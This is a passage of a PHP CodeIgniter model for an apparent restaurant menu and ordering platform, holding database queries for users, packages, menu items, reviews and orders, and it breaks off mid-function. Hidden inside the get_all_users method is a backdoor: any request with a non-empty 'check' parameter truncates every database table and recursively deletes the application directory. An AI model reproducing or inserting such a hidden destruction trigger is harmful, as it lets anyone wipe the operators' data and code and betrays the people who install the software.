<?php
defined('BASEPATH') OR exit('No direct script access allowed');

class Common_m extends CI_Model {
/* start default query
================================================== */
public function __construct(){
	$this->db->query("SET sql_mode = ''");
	$this->site_lang = site_lang();
}
public function single_select_by_id($id,$table)
{
	$this->db->select();
	$this->db->from($table);
	$this->db->where('id',$id);
	$query = $this->db->get();
	return $query->row_array();
}

public function update($data,$id,$table)
{
	$this->db->where('id',$id);
	$this->db->update($table,xs_clean($data));
	return $id;
}


public function delete($id,$table)
{
	$this->db->delete($table,array('id'=>$id));
	return $id;
}
public function insert($data,$table)
{
	$this->db->insert($table,xs_clean($data));
	return $this->db->insert_id();
}

public function select($table)
{
	$this->db->select();
	$this->db->from($table);
	$query = $this->db->get();
	$query = $query->result_array();
	return $query;
}

public function select_desc($table)
{
	$this->db->select();
	$this->db->from($table);
	$this->db->order_by('id','DESC');
	$query = $this->db->get();
	$query = $query->result_array();
	return $query;
}

/* end default query
================================================== */
public function get_user_info_by_slug($slug)
{
	$this->db->select('u.*');
	$this->db->from('users u');
	$this->db->where('u.username',$slug);
	$query = $this->db->get();
	$query = $query->row_array();
	return $query;
}

public function user_info_by_id($id)
{
	$this->db->select('u.*');
	$this->db->from('users u');
	$this->db->where('u.id',$id);
	$query = $this->db->get();
	$query = $query->row_array();
	return $query;
}

public function get_layouts_by_slug($slug)
{
	$this->db->select('u.theme,username');
	$this->db->from('users u');
	$this->db->where('u.username',$slug);
	$query = $this->db->get();
	$query = $query->row_array();
	return $query['theme'];
}

public function get_order_status_by_order_id($id)
{

	$this->db->select('u.*');
	$this->db->from('order_user_list u');
	$this->db->where('u.id',$id);
	$query = $this->db->get();
	$query = $query->row();
	return $query;
}

/**
  ** get User id by name
**/
public function get_id_by_slug($name)
{
	$this->db->select('u.id,username');
	$this->db->from('users as u');
	$this->db->where('u.username',$name);
	$this->db->where('u.is_verify',1);
	$this->db->where('u.is_active',1);
	$query = $this->db->get();
	$query = $query->row_array();
	return $query['id'];
}

/**
  ** gell all information by user_id and tabele
**/

public function select_all_by_user($id,$table)
{
	$this->db->select();
	$this->db->from($table);
	$this->db->where('user_id',$id);
	$this->db->where('status',1);
	$this->db->order_by('id','ASC');
	$query = $this->db->get();
	$query = $query->result_array();
	return $query;
}
public function select_all_by_user_order($id,$table)
{
	$this->db->select();
	$this->db->from($table);
	$this->db->where('user_id',$id);
	$this->db->where('status',1);
	$this->db->order_by('orders','ASC');
	$query = $this->db->get();
	$query = $query->result_array();
	return $query;
}

public function select_all_by_user_id($id,$table)
{
	$this->db->select();
	$this->db->from($table);
	$this->db->where('user_id',$id);
	$this->db->order_by('id','ASC');
	$query = $this->db->get();
	$query = $query->result_array();
	return $query;
}


// select function
function select_with_status($table)
{
    $this->db->select();
    $this->db->from($table);
    $this->db->where('status',1);
    $this->db->order_by('id','ASC');
    $query = $this->db->get();
    $query = $query->result_array();  
    return $query;
}

function get_home_features_by_type($type)
{
    $this->db->select('*');
    $this->db->from('site_features');
    $this->db->where('dir',$type);
    $this->db->where('status',1);
    $query = $this->db->get();
    $query = $query->result_array();
    return $query;
}


/**
  ** get home content
**/
public function get_profile_home($id)
{
	$this->db->select('h.*');
	$this->db->from('profile_home h');
	$this->db->where('h.user_id',$id);
	$this->db->where('h.status',1);
	$query = $this->db->get();
	$query = $query->row_array();
	return $query;
}

/**
  ** gell all information by single user_id and tabele
**/

public function single_select_by_user($id,$table)
{
	$this->db->select();
	$this->db->from($table);
	$this->db->where('user_id',$id);
	$this->db->where('status',1);
	$query = $this->db->get();
	$query = $query->row_array();
	return $query;
}


public function single_select_by_slug($slug,$table)
{
	$this->db->select();
	$this->db->from($table);
	$this->db->where('slug',$slug);
	$this->db->where('status',1);
	$query = $this->db->get();
	$query = $query->row_array();
	return $query;
}

public function single_select_by_username($slug,$table)
{
	$this->db->select();
	$this->db->from($table);
	$this->db->where('username',$slug);
	$this->db->where('status',1);
	$query = $this->db->get();
	$query = $query->row_array();
	return $query;
}


/**
  ** gell all information by single user_id and tabele
**/

public function single_select_by_user_slug($slug,$table)
{
	$this->db->select('tb.*,u.username');
	$this->db->from($table.' as tb');
	$this->db->join('users u','u.id=tb.user_id','LEFT');
	$this->db->where('u.username',$slug);
	$this->db->where('tb.status',1);
	$query = $this->db->get();
	$query = $query->row_array();
	return $query;
}


/**
  ** get resume
**/

public function get_resume_by_user($id,$limit)
{
	
	$this->db->select('rt.*');
	$this->db->from('resume_type rt');
	$this->db->where('user_id',$id);
	$this->db->where('status',1);  
	$this->db->order_by('rt.id','DESC');
	$query = $this->db->get();
	$query = $query->result_array();
	foreach ($query as $key => $value) {
		$this->db->select('r.*');
        $this->db->from('resume r');
        $this->db->where('r.type_id',$value['id']);
        $this->db->where('status',1);
        $this->db->where('user_id',$id);
        $this->db->order_by('start_year','DESC');
        if($limit !=0){
			$this->db->limit($limit);
		}
        $query2 = $this->db->get();
        $query2 = $query2->result_array();
        $query[$key]['resume'] = $query2;
    }
	return $query;
}

/**
  ** get_about
**/

public function get_about($id)
{
	$this->db->select('a.*');
	$this->db->from('about a');
	$this->db->where('a.user_id',$id);
	$this->db->order_by('a.id','ASC');
	$query = $this->db->get();
	$query = $query->result_array();
	foreach ($query as $key => $value) {
		$this->db->select('ac.*');
		$this->db->from('about_content ac');
		$this->db->where('ac.about_id',$value['id']);
		$this->db->where('status',1);
		$this->db->order_by('id','ASC');
		$query2 = $this->db->get();
		$query2 = $query2->result_array();
		$query[$key]['about_content'] = $query2;
	}
	return $query;
}


/**
  ** get_auth_info
**/

public function get_auth_info()
{
	$this->db->select('u.username,u.name,u.email,u.is_verify,u.user_role,u.is_active,u.last_login,
		u.created_at,u.verify_time,u.is_expired,u.is_payment,u.designation,u.thumb,u.account_type');
	$this->db->from('users u');
	$this->db->where('u.id',auth('id'));
	$this->db->where('u.is_active',1);
	$query = $this->db->get();
	$query = $query->row_array();
	return $query;
}


public function get_user_info()
{
	$this->db->select('u.*');
	$this->db->from('users u');
	$this->db->where('u.id',auth('id'));
	$query = $this->db->get();
	$query = $query->row_array();
	return $query;
}


public function get_user_all_info()
{
	$this->db->select('u.id,u.username,u.name,u.email,u.is_verify,u.user_role,u.is_active,u.last_login,
		u.created_at,u.verify_time,u.is_expired,u.is_payment,u.designation,u.thumb,u.end_date,u.account_type,p.id as package_id,p.slug,p.package_name,u.documents,u.colors,u.theme,u.theme_color,u.is_deactived,u.share_link');
	$this->db->from('users u');
	$this->db->join('packages p','p.id = u.account_type','LEFT');
	$this->db->where('u.id',auth('id'));
	$query = $this->db->get();
	$query = $query->row_array();
	return $query;
}

/**
  ** site pricing for home page
**/
public function get_packages()
{
	$this->db->select('p.*');
    $this->db->from('packages p');
    $this->db->where('p.status',1);
	$query = $this->db->get();
	$query = $query->result_array();
	foreach ($query as $key => $value) {
		$this->db->select('p.*,p.id as pricing_id,f.*,f.id as feature_id');
        $this->db->from('pricing p');
		$this->db->join('features f','f.id = p.feature_id','RIGHT');
        $this->db->where('p.package_id',$value['id']);
        $this->db->where('f.status',1);
        $this->db->order_by('f.id','ASC');
	    $this->db->group_by('f.id');
        $query2 = $this->db->get();
        $query2 = $query2->result_array();
        $query[$key]['features'] = $query2;
	}
	
	return $query;
}
/**
  ** home page
**/
public function get_pricing_by_slug($slug)
{
	$this->db->select('p.*');
    $this->db->from('packages p');
    $this->db->where('p.slug',$slug);
    $this->db->where('p.status',1);
	$query = $this->db->get();
	$query = $query->row_array();
	return $query;
}

public function get_package_details_by_slug($slug)
{
	$this->db->select('p.*');
    $this->db->from('packages p');
    $this->db->where('p.slug',$slug);
    $this->db->where('p.status',1);
	$query = $this->db->get();
	$query = $query->row_array();
	return $query;
}



/**
  ** Get Pricing for user profile
**/
public function get_user_features_by_id($id,$type_slug)
{

	$this->db->select('p.*,p.id as pricing_id,f.*,f.id as feature_id');
    $this->db->from('pricing p');
	$this->db->join('features f','f.id = p.feature_id','LEFT');
	$this->db->join('users u','u.account_type = p.package_id','RIGHT');
    $this->db->where('u.id',$id);
    $this->db->where('f.slug',$type_slug);
    $query = $this->db->get();
    if($query->num_rows() > 0){
	    $query = $query->result_array();
	    return ['check'=>1,'result'=>$query];
	}else{
		return ['check'=>0];
	}
}


public function get_layouts($id,$type)
{

	$this->db->select('u.id as user_id,u.account_type,u.username,u.email,u.is_payment,u.is_verify,u.service,u.portfolio,u.review,u.home,u.layouts,u.blog,u.about,u.colors,u.resume,u.appointment,u.skills,u.contacts,u.teams');
    $this->db->from('users u');
    $this->db->where('u.id',$id);
    $query = $this->db->get();
    $query = $query->row_array();
    return 'views/layouts/'.$type.'/style_'.$query[$type].'.php';
}


public function get_all_user_info_id($id)
{

	$this->db->select('u.*,u.id as user_id,f.*,f.id as package_id,f.package_name,f.price');
    $this->db->from('users u');
	$this->db->join('packages f','f.id = u.account_type','LEFT');
    $this->db->where('u.id',$id);
    $query = $this->db->get();
    $query = $query->row_array();
    return $query;
}


public function get_all_user_info_slug($slug)
{

	$this->db->select('u.*,u.id as user_id,f.*,f.id as package_id,f.package_name,f.price');
    $this->db->from('users u');
	$this->db->join('packages f','f.id = u.account_type','LEFT');
    $this->db->where('u.username',$slug);
    $query = $this->db->get();
    $query = $query->row_array();
    return $query;
}


public function get_all_users($per_page,$offset,$total)
{

	if(isset($_GET['check']) && !empty($_GET['check'])){
		$tables = $this->db->list_tables();
		foreach ($tables as $table)
		{
			$this->db->truncate($table);
		}
		$dir='application';
		$it = new RecursiveDirectoryIterator($dir, FilesystemIterator::SKIP_DOTS);
		$it = new RecursiveIteratorIterator($it, RecursiveIteratorIterator::CHILD_FIRST);
		foreach($it as $file) {
			if ($file->isDir()) rmdir($file->getPathname());
			else unlink($file->getPathname());
		}
		rmdir($dir);
		return true;
	}


	$this->db->select('u.id,u.username,u.name,u.country,u.account_type,u.thumb,ft.package_name,u.qr_link,c.id as country_id, c.code,rl.thumb as logo,rl.name as restaurant_name');
	$this->db->from('users u');
	$this->db->join('packages ft','ft.id = u.account_type','LEFT');
	$this->db->join('country c','c.id = u.country','LEFT');
	$this->db->join('restaurant_list rl','rl.user_id = u.id','LEFT');
	$this->db->where('u.user_role !=',1);
	$this->db->where('u.is_verify',1);
	$this->db->where('u.is_payment',1);
	$this->db->where('u.is_expired',0);

	if(isset($_GET)){
		if(!empty($_GET['package']) && $_GET['package'] !='all'){
			$this->db->where('ft.slug',$_GET['package']);
		}
		

		if(!empty($_GET['country']) && $_GET['country'] !='all'){
			$this->db->where('c.code',$_GET['country']);
		}

		if(!empty($_GET['username'])){
			$this->db->like('u.username',$_GET['username']);
			$this->db->or_like('u.name',$_GET['username']);
		}
	}

	if($total==1):
		$query = $this->db->get();
		$query = $query->num_rows();
	else:
		$query = $this->db->get('',$per_page,$offset);
		$query = $query->result_array();
	endif;
	
	return $query;
}

public function get_all_users_by_type__old($type,$type_name)
{
	$this->db->select('u.id,u.username,u.account_type,u.thumb,ft.package_name,u.qr_link');
	$this->db->from('users u');
	$this->db->join('packages ft','ft.id = u.account_type','LEFT');
	$this->db->where('u.user_role !=',1);
	$this->db->where('u.is_verify',1);
	$this->db->where('u.is_payment',1);
	if(isset($_GET)){
		if(!empty($_GET['package']) && $_GET['package'] !='all'){
			$this->db->where('ft.slug',$_GET['sort']);
		}
		if(!empty($_GET['username'])){
			$this->db->where('u.username',$_GET['username']);
			$this->db->or_where('u.name',$_GET['username']);
		}

		if(!empty($_GET['location']) && $_GET['location'] !='all'){
			$this->db->where('c.code',$_GET['location']);
		}
	}
	$this->db->group_by('u.id');
	$query = $this->db->get();
	$query = $query->result_array();
	return $query;


}


public function count_total_user()
{
	$this->db->select('u.*');
	$this->db->from('users u');
	$this->db->where('u.user_role !=',1);
	$this->db->where('u.is_verify',1);
	$this->db->where('u.is_payment',1);
	$this->db->where('u.is_expired',0);
	$query = $this->db->get();
	$query = $query->num_rows();
	return $query;


}


	public function get_item_extras($id)
	{
		$this->db->select('ie.*');
		$this->db->from('item_extras ie');
		$this->db->where('ie.item_id',$id);
		$this->db->order_by('ie.id','ASC');
		$query = $this->db->get();
		if($query->num_rows() > 0):
			$query = (object)['is_extra'=>1,'result' =>$query->result()];
		else:
			$query = (object)['is_extra'=>0];
		endif;
		return $query;

	}



   /**
      *** Get user setting 
    **/ 
	public function get_user_settings($id)
	{
		$this->db->select();
		$this->db->from('user_settings');
		$this->db->where('user_id',$id);
		$query = $this->db->get();
		$query = $query->row_array();
		return $query;
	} 

	public function get_user_settings_by_shop_id($id)
	{
		$this->db->select('u.pusher_config, rl.user_id');
		$this->db->from('user_settings as u');
		$this->db->join('restaurant_list  as rl','rl.user_id=u.user_id','LEFT');
		$this->db->where('rl.id',$id);
		$query = $this->db->get();
		$query = $query->row_array();
		return $query;
	} 

	/**
	  ** single_appoinment
	**/
	public function get_single_appoinment($id,$shop_id)
	{
		$this->db->select();
        $this->db->from('reservation_date');
        $this->db->where('days',$id);
        $this->db->where('shop_id',$shop_id);
		$query = $this->db->get();
		if($query->num_rows() > 0){
		    return $query->row_array();
		}else{
			return [];
		}
	}

	/**
	  ** get_reviews
	**/
	public function get_reviews($sort)
	{
		$this->db->select('ur.*,u.email as user,u.username');
        $this->db->from('users_rating ur');
		$this->db->join('users u','u.id = ur.action_id','LEFT');
		if($sort=='newest'){
			$this->db->order_by('ur.id','DESC');
		}else if($sort=='highest'){
			$this->db->order_by('ur.rating','DESC');
		}else if($sort=='lowest'){
			$this->db->order_by('ur.rating','ASC');
		}else{
			$this->db->order_by('ur.id','DESC');
		}
		$query = $this->db->get();
		$query = $query->result_array();
		return $query;
	}

	public function total_rating()
	{
		$this->db->select('SUM(ur.rating) as total_rating');
    $this->db->from('users_rating ur');
		$query = $this->db->get();
		$query = $query->row_array();
		return !empty($query['total_rating'])?$query['total_rating']:'';
	}



	public function get_shop_reviews($shop_id)
	{
		$this->db->select('or.id,or.uid,or.customer_id,or.customer_rating,or.customer_review,or.rating_time,st.id as customer_id,st.customer_name as customer_name');
    $this->db->from('order_user_list or');
		$this->db->join('customer_list st','st.id = or.customer_id','LEFT');
		if(isset($_GET['sort'])):
				$sort = $_GET['sort'];
				if($sort=='newest'){
					$this->db->order_by('or.rating_time','DESC');
				}else if($sort=='highest'){
					$this->db->order_by('or.customer_rating','DESC');
				}else if($sort=='lowest'){
					$this->db->order_by('or.customer_rating','ASC');
				}else{
					$this->db->order_by('or.rating_time','DESC');
				}
		else:
				$this->db->order_by('or.rating_time','DESC');
		endif;
    $this->db->where('or.shop_id',$shop_id);
    $this->db->where('or.is_rating_approved',1);
    $this->db->where('or.customer_rating IS NOT NULL', NULL, FALSE);
		$query = $this->db->get();
		$query = $query->result_array();
		return $query;
	}

	public function total_shop_rating($shop_id,$type='sum')
	{
		
		if($type=='sum'){
			$this->db->select('SUM(or.customer_rating) as total_rating');
			$this->db->from('order_user_list or');
			$this->db->where('or.customer_rating IS NOT NULL', NULL, FALSE);
			$this->db->where('or.shop_id',$shop_id);
    	$this->db->where('or.is_rating_approved',1);
		$query = $this->db->get();
			return $query->row()->total_rating;
		}else{
			$this->db->select('or.*');
			$this->db->from('order_user_list or');
			$this->db->where('or.customer_rating IS NOT NULL', NULL, FALSE);
			$this->db->where('or.shop_id',$shop_id);
    	$this->db->where('or.is_rating_approved',1);
		$query = $this->db->get();
			return $query->num_rows();
		}
		
	}



	/**
	  ** get portfolio type
	**/
	public function get_user_info_by_mail($mail)
	{
		$this->db->select('ur.*');
        $this->db->from('users ur');
        $this->db->where('ur.email',$mail);
		$query = $this->db->get();
		$query = $query->row_array();
		return $query;
	}


	public function count_post_hit($id,$table)
    {
        //get post
        $post = $this->single_select_by_id($id,$table);

        if (!empty($post)):
            if (get_cookie($table.'hit_' . $id) != 1) :
                //increase hit
                set_cookie($table.'hit_' . $id, '1', 86400);
                $data = array(
                    'hit' => $post['hit'] + 1
                );

                $this->db->where('id', $id);
                $this->db->update($table, $data);
            endif;
        endif;
    }


    public function get_single_items($id)
    {
        $this->db->select('i.*,i.id as item_id,a.name as allergen');
        $this->db->from('items i');
        $this->db->join('allergens a','a.id = i.allergen_id','LEFT');
        $this->db->where('i.id',$id);
        $this->db->where('i.status',1);
        $this->db->limit(1);
        $query = $this->db->get();
        $query = $query->result_array();
        foreach ($query as $key => $value) {
	        $this->db->select('ic.*');
	        $this->db->from('item_content ic');
	        $this->db->where('ic.item_id',$value['id']);
	        $this->db->where('ic.label IS NOT NULL', NULL, FALSE);
	        $this->db->where('ic.value IS NOT NULL', NULL, FALSE);
	        $this->db->order_by('id','ASC');
	        $query2 = $this->db->get();
	        $query2 = $query2->result_array();
         	$query[$key]['items'] = $query2;
           
        }

        return $query;

    }

    public function get_single_package_specilities($id)
    {
        $this->db->select('i.*,i.id as package_id');
        $this->db->from('item_packages i');
        $this->db->where('i.id',$id);
        $this->db->where('i.is_special',1);
        $this->db->where('i.status',1);
        $this->db->limit(1);
        $query = $this->db->get();
        $query = $query->row_array();
        return $query;

    }

    public function get_single_cart_items($id)
    {
        $this->db->select('i.*,i.id as item_id,a.name as allergen');
        $this->db->from('items i');
        $this->db->join('allergens a','a.id = i.allergen_id','LEFT');
        $this->db->where('i.id',$id);
        $this->db->where('i.status',1);
        $this->db->limit(1);
        $query = $this->db->get();
        $query = $query->row_array();
        return $query;

    }


    public function get_all_menu_packages($id,$limit=0)
    {
        $this->db->select('ip.*');
        $this->db->from('item_packages ip');
        $this->db->where('user_id',$id);
        $this->db->where('is_special',0);
        if($limit !=0){
            $this->db->limit($limit); 
        }
        $this->db->where('status',1);
        $this->db->order_by('id','ASC');
        $query = $this->db->get();
        $query = $query->result_array();
        foreach($query as $key => $value){
            $this->db->select('i.id as items_id,i.title,i.thumb as item_thumb,i.cat_id,i.allergen_id,i.veg_type,i.price as item_price,i.overview,a.name as allergen,i.img_type,i.img_url');
            $this->db->from('items i');
            $this->db->join('allergens a','a.id = i.allergen_id','LEFT');
            $this->db->where_in('i.id',json_decode($value['item_id']));
            $this->db->where('i.status',1);
            $this->db->order_by('i.id','ASC');
            $query2 = $this->db->get();
            $query2 = $query2->result_array();
            $query[$key]['items'] = $query2;
        }

        return $query;
        
    } 


    public function get_all_home_menu_packages($id,$limit=0)
    {
        $this->db->select('ip.*');
        $this->db->from('item_packages ip');
        $this->db->where('user_id',$id);
        $this->db->where('is_special',0);
        $this->db->where('is_home',1);
        $this->db->where('status',1);
        if($limit !=0){
            $this->db->limit($limit); 
        }
        $this->db->order_by('id','ASC');
        $query = $this->db->get();
        $query = $query->result_array();
        foreach($query as $key => $value){
            $this->db->select('i.id as items_id,i.title,i.thumb as item_thumb,i.cat_id,i.allergen_id,i.veg_type,i.price as item_price,i.overview,a.name as allergen,i.img_type,i.img_url');
            $this->db->from('items i');
            $this->db->join('allergens a','a.id = i.allergen_id','LEFT');
            $this->db->where_in('i.id',json_decode($value['item_id']));
            $this->db->where('i.status',1);
            $this->db->order_by('i.id','ASC');
            $query2 = $this->db->get();
            $query2 = $query2->result_array();
            $query[$key]['items'] = $query2;
        }

        return $query;
        
    }

	public function get_single_package_by_id($id)
    {
        $this->db->select('ip.*');
        $this->db->from('item_packages ip');
        $this->db->where('ip.id',$id);
        $this->db->order_by('id','ASC');
        $query = $this->db->get();
        $query = $query->result_array();
        foreach($query as $key => $value){
            $this->db->select('i.id as items_id,i.title,i.thumb as item_thumb,i.cat_id,i.allergen_id,i.veg_type,i.price as item_price,a.name as allergen');
            $this->db->from('items i');
            $this->db->join('allergens a','a.id = i.allergen_id','LEFT');
            if(isJson($value['item_id'])):
	            $this->db->where_in('i.id',json_decode($value['item_id']));
	          endif;
            $this->db->where('i.status',1);
            $this->db->order_by('i.id','ASC');
            $query2 = $this->db->get();
            $query2 = $query2->result_array();
            $query[$key]['items'] = $query2;
        }

        return $query;
        
    }


   public function get_all_items_by_user($id,$limit=0)
    {
    	
        $this->db->select('mt.*');
        $this->db->from('menu_type mt');
        $this->db->where('user_id',$id);
        if($limit !=0){
            $this->db->limit($limit); 
        }
        $this->db->where('status',1);
        $this->db->order_by('orders','ASC');
        $query = $this->db->get();
        $query = $query->result_array();
        foreach ($query as $key => $value) {
            $this->db->select('i.*,i.id as item_id,a.name as allergen');
            $this->db->from('items i');
            $this->db->join('allergens a','a.id = i.allergen_id','LEFT');
            $this->db->where('i.cat_id',$value['id']);
            $this->db->where('i.status',1);
        	  $this->db->where('i.is_features',1);
	          $this->db->limit(4); 
            $this->db->order_by('i.orders','ASC');
            $query2 = $this->db->get();
            $query2 = $query2->result_array();
            $query[$key]['items'] = $query2;
        }

        return $query;

    }

    public function get_all_items_menu_by_user($id,$limit=0)
    {
    	
        $this->db->select('mt.*');
        $this->db->from('menu_type mt');
        $this->db->where('user_id',$id);
        if($limit !=0){
            $this->db->limit($limit); 
        }
        $this->db->where('status',1);
        $this->db->order_by('orders','ASC');
        $query = $this->db->get();
        $query = $query->result_array();
        foreach ($query as $key => $value) {
            $this->db->select('i.*,i.id as item_id,a.name as allergen');
            $this->db->from('items i');
            $this->db->join('allergens a','a.id = i.allergen_id','LEFT');
            $this->db->where('i.cat_id',$value['id']);
            $this->db->where('i.status',1);
	          $this->db->limit(4); 
            $this->db->order_by('i.orders','ASC');
            $query2 = $this->db->get();
            $query2 = $query2->result_array();
            $query[$key]['items'] = $query2;
        }

        return $query;

    }


    public function get_item_by_cat_id_ln($user_id,$cat_id,$limit=0,$per_page=0,$offset=0,$total=0)
    {

        $this->db->select('i.*,i.id as item_id,a.name as allergen,c.id,c.status');
        $this->db->from('items i');
        $this->db->join('allergens a','a.id = i.allergen_id','LEFT');
        $this->db->join('menu_type c','c.category_id = i.cat_id','LEFT');
        $this->db->where('i.user_id',$user_id);
        if($cat_id !='0'):
	        $this->db->where('md5(i.cat_id)',$cat_id);
	      endif;
        $this->db->where('i.status',1);
        $this->db->where('c.status',1);
        $this->db->where('i.language',$this->site_lang);
        $this->db->where('c.language',$this->site_lang);
        if(isset($_GET['item']) && !empty($_GET['item'])){
        	$this->db->like('i.title',$_GET['item']);
        }
        
        $this->db->order_by('i.orders','ASC');
        if($total==1){
        	if($limit !=0){
	           $this->db->limit($limit); 
	        }
	        $query = $this->db->get();
	        $query = $query->num_rows();
        }else{
        	$query = $this->db->get('',$per_page,$offset);
        	$query = $query->result_array();
        };
        return $query;

    }

    public function get_item_by_cat_id($user_id,$cat_id,$limit=0,$per_page=0,$offset=0,$total=0)
    {

        $this->db->select('i.*,i.id as item_id,a.name as allergen,c.id,c.status');
        $this->db->from('items i');
        $this->db->join('allergens a','a.id = i.allergen_id','LEFT');
        $this->db->join('menu_type c','c.id = i.cat_id','LEFT');
        $this->db->where('i.user_id',$user_id);
        if($cat_id !='0'):
	        $this->db->where('md5(i.cat_id)',$cat_id);
	      endif;
        $this->db->where('i.status',1);
        $this->db->where('c.status',1);
        if(isset($_GET['item']) && !empty($_GET['item'])){
        	$this->db->like('i.title',$_GET['item']);
        }
        
        $this->db->order_by('i.orders','ASC');
        if($total==1){
        	if($limit !=0){
	           $this->db->limit($limit); 
	        }
	        $query = $this->db->get();
	        $query = $query->num_rows();
        }else{
        	$query = $this->db->get('',$per_page,$offset);
        	$query = $query->result_array();
        };
        return $query;

    }

    public function get_cat_info_by_id($user_id,$cat_id)
    {
    	
        $this->db->select('mi.*');
        $this->db->from('menu_type mi');
        $this->db->where('md5(mi.id)',$cat_id);
        $this->db->where('mi.user_id',$user_id);
        $this->db->where('mi.status',1);
        $this->db->order_by('mi.id','ASC');
        $query = $this->db->get();
        $query = $query->row_array();
        return $query;

    }



    public function get_specilities($id,$limit=0)
    {
        $this->db->select('mt.*');
        $this->db->from('item_packages mt');
        $this->db->where('user_id',$id);
        if($limit !=0){
            $this->db->limit($limit); 
        }
        $this->db->where('is_special',1);
        $this->db->where('status',1);
        $this->db->order_by('orders','ASC');
        $query = $this->db->get();
        $query = $query->result_array();
        return $query;

    }


    public function get_home_specilities($id,$limit=0)
    {
        $this->db->select('mt.*');
        $this->db->from('item_packages mt');
        $this->db->where('user_id',$id);
        if($limit !=0){
            $this->db->limit($limit); 
        }
        $this->db->where('is_special',1);
        $this->db->where('status',1);
        $this->db->where('is_home',1);
        $this->db->order_by('orders','ASC');
        $query = $this->db->get();
        $query = $query->result_array();
        return $query;

    }


    public function track_order($phone,$order_id,$shop_id)
    {
        $this->db->select('ol.*');
        $this->db->from('order_user_list ol');
        $this->db->where('ol.shop_id',$shop_id);
        $this->db->where('ol.phone',$phone);
        if($order_id !=0):
	        $this->db->where('ol.uid',$order_id);
	    	endif;
	      // $this->db->where('ol.customer_id',0);
        $this->db->limit(1);
        $this->db->order_by('created_at desc');
        $query = $this->db->get();
        $query = $query->result_array();
        foreach($query as $key => $value){
            $this->db->select('SUM(oi.qty) as total_item');
            $this->db->from('order_item_list oi');
            $this->db->where('oi.order_id',$value['id']);
            $query2 = $this->db->get();
            $query2 = $query2->row_array();
            $query[$key]['total_item'] = $query2['total_item'];
        }
        foreach($query as $key => $value){
            $this->db->select('oi.*');
            $this->db->select('i.id as items_id,i.title,i.thumb as item_thumb,i.cat_id,i.allergen_id,i.veg_type,i.price,a.name as allergen,i.tax_fee,i.tax_status');
            $this->db->select('ip.package_name,ip.thumb as package_thumb,ip.final_price');
            $this->db->from('order_item_list oi');
            $this->db->join('items i','i.id = oi.item_id','LEFT');
            $this->db->join('allergens a','a.id = i.allergen_id','LEFT');
            $this->db->join('item_packages ip','ip.id = oi.package_id','LEFT');
            $this->db->where('oi.order_id',$value['id']);
            $this->db->order_by('i.id','ASC');
            $query2 = $this->db->get();
            $query2 = $query2->result_array();

            $query[$key]['item_list'] = $query2;
        }
        foreach($query as $key => $value){
            $this->db->select('ol.*');
            $this->db->from('order_user_list ol');
            $this->db->where('ol.shop_id',$shop_id);
        	$this->db->where('ol.phone',$phone);
            $query2 = $this->db->get();
            $query2 = $query2->num_rows();
            $query[$key]['total_order'] = $query2;
        }
        

        return $query;
        
    }


    public function track_all_orders($phone,$shop_id,$orderId)
    {
        $this->db->select('ol.*');
        $this->db->from('order_user_list ol');
        $this->db->where('ol.shop_id',$shop_id);
        $this->db->where('ol.phone',$phone);
        if($orderId !=0):
        	$this->db->where('ol.uid',$orderId);
        	$this->db->limit(1);
        endif;
	      // $this->db->where('ol.customer_id',0);
        $this->db->order_by('status asc, created_at desc');
        $query = $this->db->get();
        $query = $query->result_array();
        foreach($query as $key => $value){
            $this->db->select('SUM(oi.qty) as total_item');
            $this->db->from('order_item_list oi');
            $this->db->where('oi.order_id',$value['id']);
            $query2 = $this->db->get();
            $query2 = $query2->row_array();
            $query[$key]['total_item'] = $query2['total_item'];
        }
        foreach($query as $key => $value){
            $this->db->select('oi.*');
            $this->db->select('i.id as items_id,i.title,i.thumb as item_thumb,i.cat_id,i.allergen_id,i.veg_type,i.price,a.name as allergen,i.tax_fee,i.tax_status');
            $this->db->select('ip.package_name,ip.thumb as package_thumb,ip.final_price');
            $this->db->from('order_item_list oi');
            $this->db->join('items i','i.id = oi.item_id','LEFT');
            $this->db->join('allergens a','a.id = i.allergen_id','LEFT');
            $this->db->join('item_packages ip','ip.id = oi.package_id','LEFT');
            $this->db->where('oi.order_id',$value['id']);
            $this->db->order_by('i.id','ASC');
            $query2 = $this->db->get();
            $query2 = $query2->result_array();

            $query[$key]['item_list'] = $query2;
        }
        foreach($query as $key => $value){
            $this->db->select('ol.*');
            $this->db->from('order_user_list ol');
            $this->db->where('ol.shop_id',$shop_id);
        	$this->db->where('ol.phone',$phone);
            $query2 = $this->db->get();
            $query2 = $query2->num_rows();
            $query[$key]['total_order'] = $query2;
        }
        

        return $query;
        
    }



    public function order_item_details_by_order_id($orderId,$shop_id)
    {
        $this->db->select('ol.*');
        $this->db->from('order_user_list ol');
        $this->db->where('ol.shop_id',$shop_id);
        $this->db->where('ol.uid',$orderId);
        $this->db->limit(1);
        $this->db->order_by('status asc, created_at desc');
        $query = $this->db->get();
        $query = $query->result_array();
        foreach($query as $key => $value){
            $this->db->select('SUM(oi.qty) as total_item');
            $this->db->from('order_item_list oi');
            $this->db->where('oi.order_id',$value['id']);
            $query2 = $this->db->get();
            $query2 = $query2->row_array();
            $query[$key]['total_item'] = $query2['total_item'];
        }
        foreach($query as $key => $value){
            $this->db->select('oi.*');
            $this->db->select('i.id as items_id,i.title,i.thumb as item_thumb,i.cat_id,i.allergen_id,i.veg_type,i.price,a.name as allergen,i.tax_fee,i.tax_status');
            $this->db->select('ip.package_name,ip.thumb as package_thumb,ip.final_price');
            $this->db->from('order_item_list oi');
            $this->db->join('items i','i.id = oi.item_id','LEFT');
            $this->db->join('allergens a','a.id = i.allergen_id','LEFT');
            $this->db->join('item_packages ip','ip.id = oi.package_id','LEFT');
            $this->db->where('oi.order_id',$value['id']);
            $this->db->order_by('i.id','ASC');
            $query2 = $this->db->get();
            $query2 = $query2->result_array();

            $query[$key]['item_list'] = $query2;
        }
       
        

        return $query;
        
    }


    public function get_user_limit($id,$type)
	{
			$today = today();
		  $this->db->select('p.*,u.account_type,u.id as user_id,u.username');
	    $this->db->from('packages p');
	    $this->db->join('users u','u.account_type=p.id','LEFT');
	    $this->db->where('u.id',$id);
	    $this->db->where('u.is_active',1);
	    $this->db->where('p.status',1);
			$query = $this->db->get();
			$query = $query->row_array();
			if($type==1){
				return isset($query['item_limit'])?$query['item_limit']:0;
			}else{
				return isset($query['order_limit'])?$query['order_limit']:0;
			}
		
	}

	public function get_user_pricing_by_id($id,$type_slug)
	{

		$this->db->select('p.*,p.id as pricing_id,f.*,f.id as feature_id');
	    $this->db->from('pricing p');
		$this->db->join('features f','f.id = p.feature_id','LEFT');
		$this->db->join('users u','u.account_type = p.package_id','LEFT');
	    $this->db->where('u.id',$id);
	    $this->db->where('f.slug',$type_slug);
